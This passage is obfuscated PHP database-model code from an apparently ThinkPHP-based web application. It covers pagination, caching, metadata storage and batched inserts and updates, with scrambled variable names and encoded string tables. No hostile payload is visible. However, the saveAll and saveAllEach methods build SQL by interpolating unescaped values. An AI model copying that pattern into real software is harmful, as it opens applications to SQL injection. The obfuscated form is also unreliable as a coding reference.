(is_array($¥éñ÷ƒÏ)) { foreach ($¥éñ÷ƒÏ as $ş¬â¬°ú => $Æ¡Íå§¡) { if ((is_numeric($ş¬â¬°ú) || !$ş¬â¬°ú) && is_string($Æ¡Íå§¡)) { if (strpos($Æ¡Íå§¡, $¨æØ¦¢„[350]) === 0) { continue; } think_trace($¨æØ¦¢„[351], $¨æØ¦¢„[12], $¨æØ¦¢„[49]); die; } } } if (is_string($¥éñ÷ƒÏ) && $¨æØ¦¢„[12] != $¥éñ÷ƒÏ) { $œ°°Üæ = array(); $œ°°Üæ[$¨æØ¦¢„[352]] = $¥éñ÷ƒÏ; $¥éñ÷ƒÏ = $œ°°Üæ; } if (isset($this->options[$¨æØ¦¢„[275]])) { $this->options[$¨æØ¦¢„[275]] = array_merge($this->options[$¨æØ¦¢„[275]], $¥éñ÷ƒÏ); } else { $this->options[$¨æØ¦¢„[275]] = $¥éñ÷ƒÏ; } return $this; } public function limit($Ê¦·ö«ü, $Å‰’¬¶ı = null) { $’ÒĞäÒ =& $_SERVER[ÏéâËõ‘]; $this->options[$’ÒĞäÒ[292]] = is_null($Å‰’¬¶ı) ? $Ê¦·ö«ü : $Ê¦·ö«ü . $’ÒĞäÒ[50] . $Å‰’¬¶ı; return $this; } public function page($€ÔÄğ¢Ö, $¯Ô Ç = null) { $Á¦ºœñ¤ =& $_SERVER[ÏéâËõ‘]; $this->options[$Á¦ºœñ¤[353]] = is_null($¯Ô Ç) ? $€ÔÄğ¢Ö : $€ÔÄğ¢Ö . $Á¦ºœñ¤[50] . $¯Ô Ç; return $this; } public function comment($¯Ó¨ÔøŞ) { $this->options[$_SERVER[ÏéâËõ‘][354]] = $¯Ó¨ÔøŞ; return $this; } public function setProperty($ÉáˆôØ‡, $‹‡ÄÃÛ) { if (property_exists($this, $ÉáˆôØ‡)) { $this->{$ÉáˆôØ‡} = $‹‡ÄÃÛ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\124\151\155\x65", "\x74\x69\155\x65", "\x69\156\163\145\x72\164\54\x75\160\x64\x61\x74\145", "\x66\x75\156\143\164\151\x6f\156"), array("\143\x72\x65\x61\x74\x65\124\151\x6d\145", "\164\151\x6d\145", "\151\156\163\x65\x72\164", "\x66\x75\156\x63\x74\x69\x6f\x6e")); public function setDataAuto($ùŸ‘òˆË) { $this->dataAuto = $ùŸ‘òˆË; } public function __construct($§´ŒˆŸÄ = '', $µÁ×ÖÒ² = '', $·€Œúì“ = '') { parent::__construct($§´ŒˆŸÄ, $µÁ×ÖÒ², $·€Œúì“); } protected $tableMeta = array(); protected function _beforeInsert(&$Êç¯É’‡, $üÚ¿›…à) { $½äÚş–ª =& $_SERVER[ÏéâËõ‘]; if (!$this->checkDataAutoHas($½äÚş–ª[355])) { return; } $this->dataBeforeFilter($Êç¯É’‡, $½äÚş–ª[355]); } protected function _beforeUpdate(&$İïù’§Õ, $­½ƒáÀå) { $×ôÓÙï” =& $_SERVER[ÏéâËõ‘]; if (!$this->checkDataAutoHas($×ôÓÙï”[356])) { return; } $this->dataBeforeFilter($İïù’§Õ, $×ôÓÙï”[356]); } protected function _afterSelect(&$‚–óÜó, $›Š¢ĞãÅ) { if (!is_array($‚–óÜó)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÏéâËõ‘][357])) { return; } foreach ($‚–óÜó as &$½×´¨®æ) { $this->dataAfterFilter($½×´¨®æ); } unset($½×´¨®æ); } protected function _afterFind(&$²áÔÑòê, $›şÍØ¹‹) { if (!is_array($²áÔÑòê)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÏéâËõ‘][357])) { return; } $this->dataAfterFilter($²áÔÑòê); } public static function textEncode($Ğ‡ûäˆ») { if (!$Ğ‡ûäˆ») { return $Ğ‡ûäˆ»; } $Œ°×©è½ = json_encode($Ğ‡ûäˆ»); $Œ°×©è½ = preg_replace_callback($_SERVER[ÏéâËõ‘][358], function ($âù…Ùœú) { return addslashes($âù…Ùœú[0]); }, $Œ°×©è½); return json_decode($Œ°×©è½); } public static function textDecode($ï×ë´áÒ) { $ßíäƒ =& $_SERVER[ÏéâËõ‘]; $ĞÅøâú¨ = json_encode($ï×ë´áÒ); $ĞÅøâú¨ = preg_replace_callback($ßíäƒ[359], function ($Ğ¯İ·Å) { return $_SERVER[ÏéâËõ‘][97]; }, $ĞÅøâú¨); return json_decode($ĞÅøâú¨); } public function setAutoIncrement($ç’õ—ªŒ) { $ğ¤•Ë¤Œ = array($this->getPk() => $ç’õ—ªŒ); $àıÚ÷È° = $this->data($ğ¤•Ë¤Œ)->add(); if ($àıÚ÷È°) { $this->delete($àıÚ÷È°); } } public function getAutoIncrement() { $–ò•ÑíÒ = $this->getTableName(); $÷Ñ¼ã“Û = $this->max($this->getPk()); $µ­ùØ¯Å = $this->query("\163\150\157\x77\40\164\x61\x62\154\x65\x20\163\164\x61\164\165\x73\40\167\150\x65\162\145\x20\x4e\141\x6d\145\x3d\x27{$–ò•ÑíÒ}\x27"); $ÜëÎ÷˜ = $µ­ùØ¯Å[0][$_SERVER[ÏéâËõ‘][360]]; $µÚŞƒ = max($÷Ñ¼ã“Û, $ÜëÎ÷˜); return $µÚŞƒ; } protected function _callBefore($üŞÃˆûï, $§ßæÀûæ) { return $this->cacheCallCheck($üŞÃˆûï, $§ßæÀûæ, !1); } protected function _callAfter($òÆÏ’Û‡, $’Ûü¦ìº) { return $this->cacheCallCheck($òÆÏ’Û‡, $’Ûü¦ìº, !0); } protected function cacheFunctionAlias($¸âı¥ûã) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ªÅ‹°±å, $÷»´‰Å˜, $’œÚÄÆ = false) { $æ¤µ“ = $this->cacheFunctionAlias($÷»´‰Å˜); if (!$æ¤µ“) { return; } foreach ($æ¤µ“ as $ì–Ù¦»¿ => $“šŸèÊá) { $ı‹¨„Ë¾ = $“šŸèÊá[0]; $éá„£´ú = explode($_SERVER[ÏéâËõ‘][50], $“šŸèÊá[1]); if ($ªÅ‹°±å == $ì–Ù¦»¿) { return $this->cacheFunctionGet($ì–Ù¦»¿, $ı‹¨„Ë¾); } if ($’œÚÄÆ && in_array($ªÅ‹°±å, $éá„£´ú)) { $this->cacheFunctionClear($ì–Ù¦»¿, $ı‹¨„Ë¾); } } } public function cacheFunctionGet($Èõ§ôû, $Òç—šæ°) { $”Ö“ü˜¥ = $this->cacheKeyMake($Èõ§ôû, $Òç—šæ°); $‘Ó„®ëÎ = Cache::get($”Ö“ü˜¥); if (!is_array($‘Ó„®ëÎ)) { $‘Ó„®ëÎ = call_user_func_array(array($this, $Èõ§ôû), array($Òç—šæ°, !0)); Cache::set($”Ö“ü˜¥, $‘Ó„®ëÎ); } return $‘Ó„®ëÎ; } public function cacheFunctionClear($Šıú®áø, $ ×“¡àƒ) { $æ¤Í¨ª = $ ×“¡àƒ; if (!is_array($ ×“¡àƒ)) { $æ¤Í¨ª = array($ ×“¡àƒ); } foreach ($æ¤Í¨ª as $€ËÅÊé) { $¯Ù¨éíÍ = $this->cacheKeyMake($Šıú®áø, $€ËÅÊé); Cache::remove($¯Ù¨éíÍ); } } private function cacheKeyMake($«ßüËäß, $…üßÆÁÃ) { $îáˆõâ =& $_SERVER[ÏéâËõ‘]; return get_class($this) . $îáˆõâ[11] . $«ßüËäß . $îáˆõâ[361] . $…üßÆÁÃ; } protected function selectPageReset() { $×¸ÆŞ±§ =& $_SERVER[ÏéâËõ‘]; if (isset($GLOBALS[$×¸ÆŞ±§[362]])) { return; } $GLOBALS[$×¸ÆŞ±§[362]] = isset($GLOBALS[$×¸ÆŞ±§[7]][$×¸ÆŞ±§[363]]) ? $GLOBALS[$×¸ÆŞ±§[7]][$×¸ÆŞ±§[363]] : !1; $GLOBALS[$×¸ÆŞ±§[364]] = isset($GLOBALS[$×¸ÆŞ±§[7]][$×¸ÆŞ±§[353]]) ? $GLOBALS[$×¸ÆŞ±§[7]][$×¸ÆŞ±§[353]] : !1; $GLOBALS[$×¸ÆŞ±§[7]][$×¸ÆŞ±§[363]] = !1; $GLOBALS[$×¸ÆŞ±§[7]][$×¸ÆŞ±§[353]] = !1; } protected function selectPageRestore() { $©Í²ÔÓ =& $_SERVER[ÏéâËõ‘]; if (!isset($GLOBALS[$©Í²ÔÓ[362]])) { return; } $GLOBALS[$©Í²ÔÓ[7]][$©Í²ÔÓ[363]] = $GLOBALS[$©Í²ÔÓ[362]]; $GLOBALS[$©Í²ÔÓ[7]][$©Í²ÔÓ[353]] = $GLOBALS[$©Í²ÔÓ[364]]; if ($GLOBALS[$©Í²ÔÓ[7]][$©Í²ÔÓ[363]] === !1) { unset($GLOBALS[$©Í²ÔÓ[7]][$©Í²ÔÓ[363]]); } if ($GLOBALS[$©Í²ÔÓ[7]][$©Í²ÔÓ[353]] === !1) { unset($GLOBALS[$©Í²ÔÓ[7]][$©Í²ÔÓ[353]]); } unset($GLOBALS[$©Í²ÔÓ[362]]); unset($GLOBALS[$©Í²ÔÓ[364]]); } protected function selectPage($ºÀ²È…ù = 200, $Ì§€Ì¬ = 1) { $ğôÌçà« =& $_SERVER[ÏéâËõ‘]; global $in; $¨ûÛ«» = $this->optionsValue(); $ë›¶º–â = 50000; $ºÀ²È…ù = isset($in[$ğôÌçà«[363]]) && $in[$ğôÌçà«[363]] ? $in[$ğôÌçà«[363]] : $ºÀ²È…ù; if ($ºÀ²È…ù === -1) { $in[$ğôÌçà«[363]] = !1; $ë›¶º–â = 100000000; $ºÀ²È…ù = $ë›¶º–â; } $ş§‡ù€­ = $¨ûÛ«»; $ş§‡ù€­[$ğôÌçà«[365]] = array(); $ºÀ²È…ù = intval($ºÀ²È…ù); $ºÀ²È…ù = $ºÀ²È…ù <= 5 ? 5 : ($ºÀ²È…ù >= $ë›¶º–â ? $ë›¶º–â : $ºÀ²È…ù); $Ì§€Ì¬ = intval(isset($in[$ğôÌçà«[353]]) && $in[$ğôÌçà«[353]] ? $in[$ğôÌçà«[353]] : $Ì§€Ì¬); $Ì§€Ì¬ = $Ì§€Ì¬ <= 1 ? 1 : $Ì§€Ì¬; $ó»Îïõ  = array(); $şŒ“å°â = 1; if ($Ì§€Ì¬ == 1 && $şŒ“å°â) { $this->optionsValue($¨ûÛ«»); $ó»Îïõ  = $this->page($Ì§€Ì¬, $ºÀ²È…ù)->select(); $¡Ç¨´Ş³ = is_array($ó»Îïõ ) ? count($ó»Îïõ ) : 0; if ($¡Ç¨´Ş³ < $ºÀ²È…ù) { $¯´‘ßÏ‘ = 1; } else { $this->optionsValue($ş§‡ù€­); $¡Ç¨´Ş³ = intval($this->count()); $¯´‘ßÏ‘ = ceil($¡Ç¨´Ş³ / $ºÀ²È…ù); } } else { $this->optionsValue($ş§‡ù€­); $¡Ç¨´Ş³ = intval($this->count()); $¯´‘ßÏ‘ = ceil($¡Ç¨´Ş³ / $ºÀ²È…ù); $Ì§€Ì¬ = $Ì§€Ì¬ >= $¯´‘ßÏ‘ ? $¯´‘ßÏ‘ : $Ì§€Ì¬; $this->optionsValue($¨ûÛ«»); $ó»Îïõ  = $this->page($Ì§€Ì¬, $ºÀ²È…ù)->select(); } if (!is_array($ó»Îïõ )) { $ó»Îïõ  = array(); } if ($¯´‘ßÏ‘ == 1) { $¡Ç¨´Ş³ = count($ó»Îïõ ); } $ÕêŠ÷¶¶ = array($ğôÌçà«[366] => array($ğôÌçà«[367] => $¡Ç¨´Ş³, $ğôÌçà«[363] => $ºÀ²È…ù, $ğôÌçà«[353] => $Ì§€Ì¬, $ğôÌçà«[368] => $¯´‘ßÏ‘), $ğôÌçà«[369] => $ó»Îïõ ); return $ÕêŠ÷¶¶; } protected function checkLength($ßğµ–ùõ, $¼†”¯ç = 0, $÷æÇ‚“á = '') { $˜‹çéè =& $_SERVER[ÏéâËõ‘]; $¼†”¯ç = $¼†”¯ç ? $¼†”¯ç : 65536; if (!$ßğµ–ùõ || strlen($ßğµ–ùõ) < $¼†”¯ç) { return; } $÷æÇ‚“á = $÷æÇ‚“á ? $÷æÇ‚“á . $˜‹çéè[71] : $˜‹çéè[12]; show_json($÷æÇ‚“á . LNG($˜‹çéè[370]) . "\50{$¼†”¯ç}\x29", !1); } protected function metaSet($Ô—Ë€ç­, $¡ÈÄ = null, $ó±¸Êä˜ = null) { $•ñ¦Î€è =& $_SERVER[ÏéâËõ‘]; if (!$this->tableMeta || !$Ô—Ë€ç­) { return !1; } $ºïÁÀ = $this->tableMeta[$•ñ¦Î€è[371]]; $›¤Ôç« = $this->tableMeta[$•ñ¦Î€è[372]]; $ÎÍ÷ãš = Model($›¤Ôç«); $ï…ûĞàè = array($ºïÁÀ => $Ô—Ë€ç­, $•ñ¦Î€è[373] => $¡ÈÄ); if (is_null($¡ÈÄ)) { return $ÎÍ÷ãš->where(array($ºïÁÀ => $Ô—Ë€ç­))->delete(); } if (is_null($ó±¸Êä˜) && is_string($¡ÈÄ)) { return $ÎÍ÷ãš->where($ï…ûĞàè)->delete(); } $û±¹¤Öû = is_array($¡ÈÄ) ? $¡ÈÄ : array(); if (is_string($¡ÈÄ)) { $û±¹¤Öû[$¡ÈÄ] = $ó±¸Êä˜; } $´ñ¦À‚» = array(); foreach ($û±¹¤Öû as $²çÈ“É‡ => $Â¢…ÅÖ÷) { if (is_null($Â¢…ÅÖ÷) && is_string($²çÈ“É‡)) { $ÎÍ÷ãš->where(array($ºïÁÀ => $Ô—Ë€ç­, $•ñ¦Î€è[373] => $²çÈ“É‡))->delete(); continue; } $this->checkLength($Â¢…ÅÖ÷, !1, $›¤Ôç« . $•ñ¦Î€è[4] . $²çÈ“É‡); $´ñ¦À‚»[] = array($ºïÁÀ => $Ô—Ë€ç­, $•ñ¦Î€è[94] => $²çÈ“É‡, $•ñ¦Î€è[374] => $Â¢…ÅÖ÷); } $Ãï¦…‘ = $•ñ¦Î€è[375] . $›¤Ôç«; CacheLock::lock($Ãï¦…‘); $ÎÍ÷ãš->where(array($ºïÁÀ => $Ô—Ë€ç­))->addAll($´ñ¦À‚», array(), !0); CacheLock::unlock($Ãï¦…‘); return !0; } public function metaGet($÷Óç×ÆŞ, $çèÛ†—¬ = false) { $¼Ğèßôğ =& $_SERVER[ÏéâËõ‘]; if (!$this->tableMeta) { return array(); } $ÖÍÒĞ = $this->tableMeta[$¼Ğèßôğ[371]]; $’ßÈŒâË = Model($this->tableMeta[$¼Ğèßôğ[372]]); if ($çèÛ†—¬) { $ä™ªıÅ» = array($ÖÍÒĞ => $÷Óç×ÆŞ, $¼Ğèßôğ[94] => $çèÛ†—¬); return $’ßÈŒâË->where($ä™ªıÅ»)->getField($¼Ğèßôğ[374]); } $ä™ªıÅ» = array($ÖÍÒĞ => $÷Óç×ÆŞ); $¯×†ÖÈÎ = $’ßÈŒâË->field($¼Ğèßôğ[376])->where($ä™ªıÅ»)->select(); $¯×†ÖÈÎ = array_to_keyvalue($¯×†ÖÈÎ, $¼Ğèßôğ[94], $¼Ğèßôğ[374]); return $¯×†ÖÈÎ; } private function checkDataAutoHas($Æ€‹®†Ü) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $á­’‡¶ê) { if (in_array($Æ€‹®†Ü, explode($_SERVER[ÏéâËõ‘][50], $á­’‡¶ê[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$³—ØÕÀ, $ ÃÅ¡ú») { $şãÁ‚Ôò =& $_SERVER[ÏéâËõ‘]; if (!is_array($³—ØÕÀ)) { return; } foreach ($this->dataAuto as $›™¢ª™Ñ) { $ëÅôìãµ = $›™¢ª™Ñ[0]; if (!in_array($ ÃÅ¡ú», explode($şãÁ‚Ôò[50], $›™¢ª™Ñ[2]))) { continue; } switch (trim($›™¢ª™Ñ[3])) { case $şãÁ‚Ôò[321]: case $şãÁ‚Ôò[322]: $¥Áƒ¬İ¦ = $›™¢ª™Ñ[1]; $Ãæ³áĞ³ = isset($›™¢ª™Ñ[4]) ? (array) $›™¢ª™Ñ[4] : array(); if ($¥Áƒ¬İ¦ == $şãÁ‚Ôò[203] && array_key_exists($ëÅôìãµ, $³—ØÕÀ)) { if (!$³—ØÕÀ[$ëÅôìãµ]) { unset($³—ØÕÀ[$ëÅôìãµ]); } break; } if (isset($³—ØÕÀ[$ëÅôìãµ])) { array_unshift($Ãæ³áĞ³, $³—ØÕÀ[$ëÅôìãµ]); } if ($şãÁ‚Ôò[321] == $›™¢ª™Ñ[3]) { $³—ØÕÀ[$ëÅôìãµ] = call_user_func_array($¥Áƒ¬İ¦, $Ãæ³áĞ³); } else { $³—ØÕÀ[$ëÅôìãµ] = call_user_func_array(array(&$this, $¥Áƒ¬İ¦), $Ãæ³áĞ³); } break; case $şãÁ‚Ôò[270]: if (isset($³—ØÕÀ[$ëÅôìãµ]) && $³—ØÕÀ[$ëÅôìãµ]) { $³—ØÕÀ[$ëÅôìãµ] = call_user_func_array(array(&$this, $›™¢ª™Ñ[1]), array($³—ØÕÀ[$ëÅôìãµ])); } break; case $şãÁ‚Ôò[273]: $³—ØÕÀ[$ëÅôìãµ] = $³—ØÕÀ[$›™¢ª™Ñ[1]]; break; case $şãÁ‚Ôò[294]: if (isset($³—ØÕÀ[$ëÅôìãµ]) && !is_string($³—ØÕÀ[$ëÅôìãµ])) { $³—ØÕÀ[$ëÅôìãµ] = json_encode_force($³—ØÕÀ[$ëÅôìãµ]); } break; case $şãÁ‚Ôò[323]: if ($³—ØÕÀ[$ëÅôìãµ] === $şãÁ‚Ôò[12]) { unset($³—ØÕÀ[$ëÅôìãµ]); } break; case $şãÁ‚Ôò[324]: $³—ØÕÀ[$ëÅôìãµ] = $›™¢ª™Ñ[1]; default: break; } } if ($ ÃÅ¡ú» == $şãÁ‚Ôò[355]) { $«ú‘¢À = strtolower($this->db->getDbType()); if (strpos($«ú‘¢À, $şãÁ‚Ôò[13]) !== 0) { return; } $„ıá¬Â® = $this->field(!0)->fields; $Øíœ‰ğË = $„ıá¬Â®[$şãÁ‚Ôò[252]]; if (isset($„ıá¬Â®[$şãÁ‚Ôò[251]])) { unset($Øíœ‰ğË[$„ıá¬Â®[$şãÁ‚Ôò[251]]]); } foreach ($Øíœ‰ğË as $»ó°»ÎÉ => $ ÃÅ¡ú») { if (!isset($³—ØÕÀ[$»ó°»ÎÉ])) { $³—ØÕÀ[$»ó°»ÎÉ] = $şãÁ‚Ôò[12]; } } } } private function dataAfterFilter(&$µ«¾¾°î) { $ÏÃÛôÇ³ =& $_SERVER[ÏéâËõ‘]; foreach ($this->dataAuto as $•Ñ¯ÉÅˆ) { $•äœô»å = $•Ñ¯ÉÅˆ[0]; if (!isset($µ«¾¾°î[$•äœô»å])) { continue; } if (!in_array($ÏÃÛôÇ³[357], explode($ÏÃÛôÇ³[50], $•Ñ¯ÉÅˆ[2]))) { continue; } switch (trim($•Ñ¯ÉÅˆ[3])) { case $ÏÃÛôÇ³[321]: case $ÏÃÛôÇ³[322]: $¸®Êİ = isset($•Ñ¯ÉÅˆ[4]) ? (array) $•Ñ¯ÉÅˆ[4] : array(); array_unshift($¸®Êİ, $µ«¾¾°î[$•äœô»å]); if (isset($•Ñ¯ÉÅˆ[4]) && $•Ñ¯ÉÅˆ[4] == $ÏÃÛôÇ³[377]) { $¸®Êİ = array($µ«¾¾°î[$•äœô»å]); } if ($ÏÃÛôÇ³[321] == $•Ñ¯ÉÅˆ[3]) { $µ«¾¾°î[$•äœô»å] = call_user_func_array($•Ñ¯ÉÅˆ[1], $¸®Êİ); } else { $µ«¾¾°î[$•äœô»å] = call_user_func_array(array(&$this, $•Ñ¯ÉÅˆ[1]), $¸®Êİ); } break; case $ÏÃÛôÇ³[270]: if (isset($µ«¾¾°î[$•äœô»å]) && $µ«¾¾°î[$•äœô»å]) { $µ«¾¾°î[$•äœô»å] = call_user_func_array(array(&$this, $•Ñ¯ÉÅˆ[1]), array($µ«¾¾°î[$•äœô»å])); } break; case $ÏÃÛôÇ³[273]: $µ«¾¾°î[$•äœô»å] = $µ«¾¾°î[$•Ñ¯ÉÅˆ[1]]; break; case $ÏÃÛôÇ³[294]: $•ê­Íå = $µ«¾¾°î[$•äœô»å]; $µ«¾¾°î[$•äœô»å] = json_decode($•ê­Íå, !0); if (is_null($µ«¾¾°î[$•äœô»å])) { $µ«¾¾°î[$•äœô»å] = $•ê­Íå; } break; case $ÏÃÛôÇ³[323]: if ($µ«¾¾°î[$•äœô»å] === $ÏÃÛôÇ³[12]) { unset($µ«¾¾°î[$•äœô»å]); } break; case $ÏÃÛôÇ³[324]: $µ«¾¾°î[$•äœô»å] = $•Ñ¯ÉÅˆ[1]; break; default: break; } } } public function saveAll($±•Ä“®Ë) { $¸Ø»ø„ˆ =& $_SERVER[ÏéâËõ‘]; $ØÄÇˆ›û = $this->tablePrefix . $this->tableName; $õùíİµ = self::SQL_WHERE_IN_CHUNK; $±•Ä“®Ë = is_array($±•Ä“®Ë) ? $±•Ä“®Ë : array(); $µâóí¯£ = $¸Ø»ø„ˆ[378]; $°ıÁë¼è = 0; $í“‡Ü¿‰ = array(); $ëÓ­‹¼ = count($±•Ä“®Ë); for ($¨ÑïÇÚØ = 0; $¨ÑïÇÚØ < $ëÓ­‹¼; $¨ÑïÇÚØ++) { $€Ú±œåÃ = $±•Ä“®Ë[$¨ÑïÇÚØ]; if (!is_array($€Ú±œåÃ) || count($€Ú±œåÃ) != 4) { continue; } $Ö—ñ‰Œî = "\125\120\x44\x41\124\x45\40\140{$ØÄÇˆ›û}\140\40\123\x45\124\40{$€Ú±œåÃ[2]}\x20\x3d\40\103\101\x53\105\40{$€Ú±œåÃ[0]}\40\12"; if ($°ıÁë¼è == 0) { $µâóí¯£ = $Ö—ñ‰Œî; } $í“‡Ü¿‰[] = $¸Ø»ø„ˆ[118] . $€Ú±œåÃ[1] . $¸Ø»ø„ˆ[118]; $°ıÁë¼è++; $µâóí¯£ .= "\40\x57\x48\105\116\40\x27{$€Ú±œåÃ[1]}\47\40\124\x48\105\x4e\x20\x27{$€Ú±œåÃ[3]}\47\40\12"; if ($°ıÁë¼è == $õùíİµ || $¨ÑïÇÚØ == $ëÓ­‹¼ - 1) { $û¥¥—àñ = implode($¸Ø»ø„ˆ[50], $í“‡Ü¿‰); $µâóí¯£ .= "\40\105\116\104\x20\x20\127\110\105\x52\x45\40{$€Ú±œåÃ[0]}\x20\x49\116\x20\x28{$û¥¥—àñ}\51\x20"; $this->execute($µâóí¯£); $°ıÁë¼è = 0; $µâóí¯£ = $Ö—ñ‰Œî; $this->chunkEventCheck(count($í“‡Ü¿‰)); $í“‡Ü¿‰ = array(); } } $this->chunkEventSet(); } public function saveAllEach($úç–ı€) { $úÉ„àïƒ =& $_SERVER[ÏéâËõ‘]; $¥èáÏŸ¬ = $this->tablePrefix . $this->tableName; foreach ($úç–ı€ as $å¥¬ô÷) { if (!is_array($å¥¬ô÷) || count($å¥¬ô÷) != 4) { continue; } $áı‹Êš = $å¥¬ô÷[0] . $úÉ„àïƒ[379] . $å¥¬ô÷[1] . $úÉ„àïƒ[118]; $Æ°Ê­ëå = $å¥¬ô÷[2] . $úÉ„àïƒ[379] . $å¥¬ô÷[3] . $úÉ„àïƒ[118]; $Œöº–ğÎ = "\165\x70\x64\141\164\145\40{$¥èáÏŸ¬}\x20\x73\x65\x74\40{$Æ°Ê­ëå}\x20\167\150\x65\x72\x65\x20{$áı‹Êš}\73"; $this->execute($Œöº–ğÎ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ù¯ÉèÈø = false, $„Ï…«üœ = false) { $this->_chunkEvent = $ù¯ÉèÈø; $this->_chunkEventParam = $„Ï…«üœ; } private function chunkEventCheck($ÀíÁêüğ) { if (!$this->_chunkEvent) { return; } $‰šàÀóŠ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‰šàÀóŠ[$_SERVER[ÏéâËõ‘][380]] = $ÀíÁêüğ; Hook::trigger($this->_chunkEvent, $‰šàÀóŠ); } public function addAll($¸‰½ê¼“, $•¿ÛŒãÓ = array(), $Àêì­…Ä = false) { $¢Üà´ß =& $_SERVER[ÏéâËõ‘]; ignore_timeout(); $ß²ÙİÛ˜ = self::SQL_WHERE_IN_CHUNK; if (empty($¸‰½ê¼“)) { $this->error = think_lang($¢Üà´ß[271]); return !1; } $•¿ÛŒãÓ = $this->_parseOptions($•¿ÛŒãÓ); foreach ($¸‰½ê¼“ as $´ˆì‘®¯ => $Ø½Õ˜Ô¨) { $¸‰½ê¼“[$´ˆì‘®¯] = $this->_facade($Ø½Õ˜Ô¨); $this->_beforeInsert($¸‰½ê¼“[$´ˆì‘®¯], $•¿ÛŒãÓ); } if (method_exists($this->db, $¢Üà´ß[272])) { for ($„‹Üø‡ = 0; $„‹Üø‡ < count($¸‰½ê¼“); $„‹Üø‡ += $ß²ÙİÛ˜) { $½ë°Ÿô„ = array_slice($¸‰½ê¼“, $„‹Üø‡, $ß²ÙİÛ˜); if (!is_array($½ë°Ÿô„) || count($½ë°Ÿô„) == 0) { break; } $ÑÄ¿ßš = $this->db->insertAll($½ë°Ÿô„, $•¿ÛŒãÓ, $Àêì­…Ä); $this->chunkEventCheck(count($½ë°Ÿô„)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¸‰½ê¼“ as $´ˆì‘®¯ => $Ø½Õ˜Ô¨) { $ÑÄ¿ßš = $this->db->insert($Ø½Õ˜Ô¨, $•¿ÛŒãÓ, $Àêì­…Ä); } $this->commit(); } if (!1 !== $ÑÄ¿ßš) { $Ş’°­é¾ = $this->getLastInsID(); if ($Ş’°­é¾) { return $Ş’°­é¾; } } return $ÑÄ¿ßš; } public function save($äÔòŒÕ = '', $şæí´Õ = array()) { $’´ùíË£ =& $_SERVER[ÏéâËõ‘]; $å©ıßĞ = self::SQL_WHERE_IN_CHUNK; $¶€Âş†Ÿ = $this->optionsValue(); $·ôìœ­ò = $this->findWhereField($¶€Âş†Ÿ); if (!$·ôìœ­ò) { return parent::save($äÔòŒÕ, $şæí´Õ); } $†­çò²” = 0; $şÃú©· = $¶€Âş†Ÿ[$’´ùíË£[275]][$·ôìœ­ò][1]; $şÃú©· = is_array($şÃú©·) ? $şÃú©· : array(); $“¬™Ä˜¶ = count($şÃú©·); for ($»Ã§îê  = 0; $»Ã§îê  < $“¬™Ä˜¶; $»Ã§îê  += $å©ıßĞ) { $¸¯İª› = array_slice($şÃú©·, $»Ã§îê , $å©ıßĞ); if (!is_array($¸¯İª›) || count($¸¯İª›) == 0) { break; } $¶€Âş†Ÿ[$’´ùíË£[275]][$·ôìœ­ò][1] = $¸¯İª›; $this->optionsValue($¶€Âş†Ÿ); $†­çò²” += parent::save($äÔòŒÕ, $şæí´Õ); $this->chunkEventCheck(count($¸¯İª›)); } $this->chunkEventSet(); return $†­çò²”; } public function add($¹×ÙÜ¯¾ = '', $‰îÚ×è¶ = array(), $ ¬ôà´× = false) { if ($this->addTaskStatus && is_array($¹×ÙÜ¯¾)) { $this->addTaskData[] = $¹×ÙÜ¯¾; return; } return parent::add($¹×ÙÜ¯¾, $‰îÚ×è¶, $ ¬ôà´×); } public function parseWhereLike($ÌÖ¯¿î×, $¥‰Íàõ = '', $üïêè© = false, &$ºôÕæ¸™ = false) { $Â»ÊĞ¡Ó =& $_SERVER[ÏéâËõ‘]; $œ“¶¸¿¤ = $GLOBALS[$Â»ÊĞ¡Ó[6]][$Â»ÊĞ¡Ó[381]]; if (!$œ“¶¸¿¤[$Â»ÊĞ¡Ó[382]]) { return $ÌÖ¯¿î×; } if (!is_array($ÌÖ¯¿î×)) { return $ÌÖ¯¿î×; } $¡Æ¦ãÑá = array(); $‡°ó‡õ = 0; foreach ($ÌÖ¯¿î× as $—“¹ÓÆÖ => $şèó±ÙÅ) { if (is_array($şèó±ÙÅ) && count($şèó±ÙÅ) == 2 && $şèó±ÙÅ[0] == $Â»ÊĞ¡Ó[383] && is_string($şèó±ÙÅ[1]) && substr($şèó±ÙÅ[1], 0, 1) == $Â»ÊĞ¡Ó[384] && substr($şèó±ÙÅ[1], strlen($şèó±ÙÅ[1]) - 1, 1) == $Â»ÊĞ¡Ó[384]) { $ºôÕæ¸™ = !0; $ñ²ë÷ô‰ = is_string($—“¹ÓÆÖ) ? $—“¹ÓÆÖ : $¥‰Íàõ; $“‘†é¥å = substr($şèó±ÙÅ[1], 1, strlen($şèó±ÙÅ[1]) - 2); $“‘†é¥å = $this->db->escapeString($“‘†é¥å); if (!strpos($ñ²ë÷ô‰, $Â»ÊĞ¡Ó[10])) { $ñ²ë÷ô‰ = $Â»ÊĞ¡Ó[385] . $ñ²ë÷ô‰ . $Â»ÊĞ¡Ó[385]; } $Ü”Î®‚ = $Â»ÊĞ¡Ó[188] . $“‘†é¥å . $Â»ÊĞ¡Ó[188]; $“‘†é¥å = str_replace(array($Â»ÊĞ¡Ó[10], $Â»ÊĞ¡Ó[386], $Â»ÊĞ¡Ó[11]), $Â»ÊĞ¡Ó[387], $“‘†é¥å); if ($œ“¶¸¿¤[$Â»ÊĞ¡Ó[388]]) { $Ü”Î®‚ = $Â»ÊĞ¡Ó[389] . $“‘†é¥å . $Â»ÊĞ¡Ó[390]; if ($œ“¶¸¿¤[$Â»ÊĞ¡Ó[391]]) { $Ü”Î®‚ = $Â»ÊĞ¡Ó[390] . $“‘†é¥å . $Â»ÊĞ¡Ó[389]; } } $¡Æ¦ãÑá[$‡°ó‡õ] = $Â»ÊĞ¡Ó[392] . $ñ²ë÷ô‰ . $Â»ÊĞ¡Ó[393] . $Ü”Î®‚ . $Â»ÊĞ¡Ó[394]; $‡°ó‡õ++; continue; } if (is_array($şèó±ÙÅ)) { 